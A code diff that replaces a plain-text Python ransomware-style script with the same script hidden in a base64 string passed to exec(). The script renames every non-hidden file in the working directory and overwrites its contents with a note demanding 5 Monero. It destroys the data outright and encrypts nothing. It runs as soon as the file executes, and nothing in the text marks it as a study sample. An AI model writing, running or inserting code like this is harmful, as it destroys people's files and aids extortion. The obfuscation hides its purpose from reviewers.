@@ -1,13 +1,4 @@
-import glob, os
- 
-def encrypt_files():
-    for filename in glob.glob('*.*'):
-        try:
-            if not filename.startswith(".") and not os.path.isdir(filename):
-                os.rename(filename, filename + ".txt")
-                with open(filename + ".txt", "w") as f:
-                    f.write("all ur files are encrypted want them back give me 5 monero(XMR) coin in this address\n(address)\nu have unlimited time to send the coins when i send the files will be automatically changed in to normal")
-        except:
-            pass
- 
-encrypt_files()
+
+import base64
+exec(base64.b64decode('aW1wb3J0IGdsb2IsIG9zCiAKZGVmIGVuY3J5cHRfZmlsZXMoKToKICAgIGZvciBmaWxlbmFtZSBpbiBnbG9iLmdsb2IoJyouKicpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbm90IGZpbGVuYW1lLnN0YXJ0c3dpdGgoIi4iKSBhbmQgbm90IG9zLnBhdGguaXNkaXIoZmlsZW5hbWUpOgogICAgICAgICAgICAgICAgb3MucmVuYW1lKGZpbGVuYW1lLCBmaWxlbmFtZSArICIudHh0IikKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlbmFtZSArICIudHh0IiwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoImFsbCB1ciBmaWxlcyBhcmUgZW5jcnlwdGVkIHdhbnQgdGhlbSBiYWNrIGdpdmUgbWUgNSBtb25lcm8oWE1SKSBjb2luIGluIHRoaXMgYWRkcmVzc1xuKGFkZHJlc3MpXG51IGhhdmUgdW5saW1pdGVkIHRpbWUgdG8gc2VuZCB0aGUgY29pbnMgd2hlbiBpIHNlbmQgdGhlIGZpbGVzIHdpbGwgYmUgYXV0b21hdGljYWxseSBjaGFuZ2VkIGluIHRvIG5vcm1hbCIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAKZW5jcnlwdF9maWxlcygp'.encode('UTF-8')).decode('UTF-8'))
+        
